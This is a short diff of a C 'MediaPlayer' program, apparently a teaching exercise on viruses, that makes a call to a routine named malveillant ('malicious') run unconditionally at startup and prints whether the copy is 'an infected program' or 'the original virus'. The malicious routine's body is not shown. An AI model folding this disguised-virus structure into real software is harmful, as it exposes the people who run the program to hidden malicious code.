@@ -1,13 +1,20 @@
 #include "MediaPlayer.h"
 
 int main(int argc, char *argv[]) {
-        mediaplayer();
-        //malveillant();
+
+        malveillant();
+        char *name = argv[0];
+
+        // Supprime le . et le /
+        memmove(name, name+2, strlen(name));
+        printf("%s",name);
 
         if(strcmp(argv[0],"./MediaPlayer")) {
                 printf("\nNous sommes dans un programme infecté\n");
+
         }
         else {
+                mediaplayer();
                 printf("\nNous sommes dans le virus originel\n");
         }
         return 0;
